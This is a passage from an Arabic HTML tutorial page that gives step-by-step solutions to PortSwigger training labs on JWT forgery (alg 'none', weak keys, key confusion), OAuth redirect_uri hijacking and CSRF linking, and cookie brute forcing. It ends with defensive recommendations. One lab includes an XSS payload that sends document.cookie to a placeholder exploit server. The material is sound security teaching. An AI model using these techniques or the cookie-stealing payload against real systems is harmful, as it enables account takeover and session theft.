4. استخدم reset token الخاص بك لتغيير كلمة مرور الضحية
5. سجل دخول بالبيانات الجديدة
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>🔐 مختبرات JWT</h3>

            <div class="lab-card">
                <h4>🧪 Lab 4: JWT authentication bypass via unverified signature</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة عبر JWT غير محقق التوقيع</p>
                <p><strong>التقنية:</strong> تعديل payload دون تحديث signature</p>
                <div class="code-block">
# خطوات الحل:
1. سجل دخول وانسخ JWT من cookie
2. فك تشفير JWT في jwt.io
3. غيّر "sub" من "wiener" إلى "administrator" 
4. احتفظ بنفس signature القديم
5. استبدل cookie واعرض /admin
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 5: JWT authentication bypass via flawed signature verification</h4>
                <p><strong>الهدف:</strong> استغلال ثغرة "none algorithm"</p>
                <p><strong>التقنية:</strong> تغيير alg إلى "none" وحذف signature</p>
                <div class="code-block">
# خطوات الحل:
1. فك تشفير JWT الحالي
2. غيّر header: {"alg":"none","typ":"JWT"}
3. غيّر payload: "sub" إلى "administrator"
4. أعد ترميز header.payload بـ Base64URL
5. JWT النهائي: header.payload. (بدون signature)
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 6: JWT authentication bypass via weak signing key</h4>
                <p><strong>الهدف:</strong> كسر مفتاح HMAC ضعيف وإنشاء JWT جديد</p>
                <p><strong>التقنية:</strong> استخدام hashcat لكسر secret ثم توقيع JWT جديد</p>
                <div class="code-block">
# خطوات الحل:
1. احفظ JWT في ملف: echo "jwt_here" > jwt.txt
2. كسر بـ hashcat: hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist
3. استخدم secret المكسور لإنشاء JWT جديد:
   python3 -c "import jwt; print(jwt.encode({'sub':'administrator'}, 'secret', 'HS256'))"
4. استبدل cookie بالـ JWT الجديد
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 7: JWT authentication bypass via algorithm confusion</h4>
                <p><strong>الهدف:</strong> استغلال Key Confusion (RS256 → HS256)</p>
                <p><strong>التقنية:</strong> استخدام المفتاح العام كـ HMAC secret</p>
                <div class="code-block">
# خطوات الحل:
1. احصل على JWT وفك تشفيره
2. حمّل المفتاح العام من /jwks.json
3. حوّل JWK إلى PEM format
4. وقّع JWT جديد بـ HS256 مستخدماً المفتاح العام:
   jwt.encode({'sub':'administrator'}, public_key, 'HS256')
5. استبدل cookie وادخل /admin
                </div>
                <a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>🔗 مختبرات OAuth 2.0</h3>

            <div class="lab-card">
                <h4>🧪 Lab 8: Authentication bypass via OAuth implicit flow</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة في OAuth implicit flow</p>
                <p><strong>التقنية:</strong> تعديل email parameter في POST request</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth login مع social media
2. اعترض POST request إلى /authenticate
3. غيّر email parameter إلى carlos@carlos-montoya.net
4. أرسل الطلب وستسجل دخول كـ carlos
5. اعرض /admin لحذف المستخدم
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 9: Forced OAuth profile linking</h4>
                <p><strong>الهدف:</strong> ربط حساب OAuth بحساب ضحية عبر CSRF</p>
                <p><strong>التقنية:</strong> إنشاء CSRF لربط حسابك بحساب admin</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth linking لحسابك
2. توقف قبل الخطوة الأخيرة وانسخ URL
3. أنشئ HTML page مع iframe للـ URL
4. أرسل الرابط للضحية (admin)
5. سجل دخول بحساب OAuth وستصبح admin
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 10: OAuth account hijacking via redirect_uri</h4>
                <p><strong>الهدف:</strong> اختطاف حساب عبر استغلال redirect_uri</p>
                <p><strong>التقنية:</strong> توجيه authorization code لخادم المهاجم</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth flow وحلل redirect_uri
2. غيّر redirect_uri إلى https://YOUR-EXPLOIT-SERVER
3. أرسل الرابط للضحية
4. اعترض authorization code من exploit server logs
5. استخدم code لتسجيل الدخول كالضحية
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>💪 مختبرات متقدمة</h3>

            <div class="lab-card">
                <h4>🧪 Lab 11: Brute-forcing a stay-logged-in cookie</h4>
                <p><strong>الهدف:</strong> كسر stay-logged-in cookie مُرمز بـ Base64</p>
                <p><strong>التقنية:</strong> Brute force على MD5(password) المُرمز بـ Base64</p>
                <div class="code-block">
# خطوات الحل:
1. حلل stay-logged-in cookie: base64decode(username:md5(password))
2. أنشئ قائمة كلمات مرور مُرمزة: carlos:md5(password)
3. رمّز كل واحدة بـ Base64
4. استخدم Burp Intruder للـ brute force
5. سجل دخول بالـ cookie الصحيح
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 12: Offline password cracking</h4>
                <p><strong>الهدف:</strong> استغلال XSS لسرقة cookie وكسر كلمة المرور</p>
                <p><strong>التقنية:</strong> XSS + Cookie theft + Password cracking</p>
                <div class="code-block">
# خطوات الحل:
1. اكتشف XSS في comment section
2. أنشئ payload لسرقة cookie:
   &lt;script&gt;document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie&lt;/script&gt;
3. اعترض stay-logged-in cookie من exploit server logs
4. فك تشفير وكسر MD5 hash
5. سجل دخول بالبيانات المكسورة
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="tip">
                <h4>💡 نصائح لحل المختبرات</h4>
                <ul class="list">
                    <li><strong>استخدم Burp Suite:</strong> أداة أساسية لاعتراض وتعديل الطلبات</li>
                    <li><strong>حلل الردود:</strong> ابحث عن اختلافات في response length أو error messages</li>
                    <li><strong>اقرأ التوثيق:</strong> كل مختبر له تلميحات مفيدة</li>
                    <li><strong>استخدم jwt.io:</strong> لفك تشفير وتحليل JWT tokens</li>
                    <li><strong>احفظ النتائج:</strong> وثق كل خطوة للمراجعة لاحقاً</li>
                </ul>
            </div>
        </section>

        <section id="defense">
            <h2><i class="fas fa-shield-halved"></i> طرق الحماية</h2>
            <div class="grid">
                <div class="card">
                    <h3>مصادقة وجلسات</h3>
                    <ul class="list">
                        <li>فرض MFA، قفل الحساب مؤقتاً، Hash قوي (Argon2/Bcrypt)</li>
                        <li>دوران الجلسة بعد تسجيل الدخول، HttpOnly + SameSite=strict</li>
                        <li>قوائم سماح IP للمشغلين الحساسين</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>OAuth وآليات الرموز (JWT/JWE) آمنة</h3>
                    <ul class="list">
                        <li>PKCE إلزامي لكل التطبيقات العامة</li>
                        <li>تطابق صارم لـ redirect_uri بدون wildcards</li>
                        <li>تقليل الصلاحيات (Least Privilege) ومراجعة scopes</li>
                        <li>تدوير tokens، تقصير عمر access token، إبطال refresh token</li>
                        <li>JWS فقط للتحقق من السلامة؛ JWE عند الحاجة للسرية (يفضل AEAD مثل A256GCM)</li>
                        <li>رفض alg="none"، منع Key Confusion، إدارة مفاتيح آمنة وتدويرها</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="summary">
            <h2><i class="fas fa-list-check"></i> الخلاصة</h2>
            <p>Broken Authentication وOAuth أخطاء تصميم وتطبيق أكثر من كونها ثغرات منفردة. الحماية الفعالة تحتاج حوكمة الهوية، تنفيذ دقيق لـOAuth 2.0 + PKCE، وإدارة جلسات صارمة.</p>
        </section>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({
            startOnLoad: true,
            theme: 'dark',
            themeVariables: {
                primaryColor: '#42a5f5',
                primaryTextColor: '#e8eaed',
                primaryBorderColor: '#2d3748',
                lineColor: '#81c784',
                secondaryColor: '#1a2332',
                tertiaryColor: '#0f1724',
                background: '#1a2332',
                mainBkg: '#1a2332',
                secondBkg: '#0f1724',
                tertiaryBkg: '#2d3748',
                nodeBorder: '#2d3748',
                clusterBkg: '#0f1724',
                clusterBorder: '#2d3748',
                defaultLinkColor: '#81c784',
                titleColor: '#e8eaed',
                edgeLabelBackground: '#1a2332',
                nodeTextColor: '#e8eaed',
                // إضافات لضمان الوضوح
                textColor: '#e8eaed',
                actorTextColor: '#e8eaed',
                labelTextColor: '#e8eaed',
                loopTextColor: '#e8eaed',
                activationTextColor: '#e8eaed',
                sectionBkgColor: '#1a2332',
                altSectionBkgColor: '#0f1724',
                gridColor: '#2d3748',
                c0: '#42a5f5',  // Class diagram colors
                c1: '#81c784',
                c2: '#ff9800',
                c3: '#e91e63'
            }
        });
    </script>
</body>
</html> 